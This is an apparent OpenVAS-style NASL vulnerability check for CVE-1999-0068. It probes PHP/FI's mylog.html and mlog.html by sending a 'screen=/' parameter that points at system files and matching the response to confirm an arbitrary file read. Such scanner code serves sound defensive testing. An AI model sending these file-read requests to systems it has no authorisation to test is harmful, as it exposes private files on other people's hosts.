if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.15708" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 713 );
	script_cve_id( "CVE-1999-0068" );
	script_xref( name: "OSVDB", value: "3396" );
	script_xref( name: "OSVDB", value: "3397" );
	script_name( "PHP mylog.html/mlog.html read arbitrary file" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2004 David Maciejak" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "The remote host is running PHP/FI.

  The remote version of this software contains a flaw in
  the files mylog.html/mlog.html than can allow a remote attacker
  to view arbitrary files on the remote host." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Upgrade to version 3.0 or newer" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
files = traversal_files();
for dir in nasl_make_list_unique( "/php", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for htmlfile in make_list( "/mylog.html",
		 "/mlog.html" ) {
		for pattern in keys( files ) {
			file = files[pattern];
			url = dir + htmlfile + "?screen=/" + file;
			if(http_vuln_check( port: port, url: url, pattern: pattern )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

